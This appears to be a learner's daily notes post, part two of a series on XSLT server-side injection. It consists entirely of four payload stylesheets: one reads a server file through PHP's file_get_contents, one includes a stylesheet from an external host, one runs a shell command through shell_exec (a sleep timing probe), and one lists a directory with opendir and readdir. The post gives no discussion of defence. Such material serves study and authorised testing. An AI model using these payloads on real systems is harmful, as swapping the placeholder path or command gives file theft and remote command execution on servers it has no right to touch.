Daily Notes : Day 89 
XSLT Server Side Injection 
(Extensible Stylesheet Language Transformations) - Part 2

 1.⁠ ⁠Internal (PHP-function)
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>

2. Include external XSL
<xsl:include href="http://extenal.web/external.xsl"/>

3. Execute code (php:function)
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>

4. Opendir + readdir
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>